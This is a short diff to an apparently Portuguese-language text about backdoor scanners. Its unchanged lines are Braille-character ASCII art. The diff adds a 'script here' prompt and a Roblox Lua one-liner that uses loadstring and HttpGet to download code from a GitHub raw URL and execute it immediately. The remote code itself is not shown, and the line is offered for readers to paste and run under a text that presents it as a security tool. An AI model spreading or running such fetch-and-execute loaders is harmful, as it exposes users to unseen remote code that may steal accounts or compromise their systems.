@@ -37,3 +37,6 @@ Portanto, o uso de um backdoor scanner deve ser entendido como parte de um proce
 ⣿⣿⣿⣿⣿⣷⣮⣞⢵⡻⣼⣝⣮⢷⡹⣖⢧⡻⣥⢳⣎⡳⣭⢳⣥⣛⣬⢳⠹⢎⠃⣁⣴⣿⣿⣿⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡔⠉⢻⣯⡟⣽⣯⣷⣯⣷⡞⣷⣭⣷⡎⢳⠈⢠⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣷⣭⣭⣾⣙⣋⢏⣡⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+
+Scrpit aqui! ⬇:
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rudha33/RScrpit-BSs/refs/heads/main/code",true))()
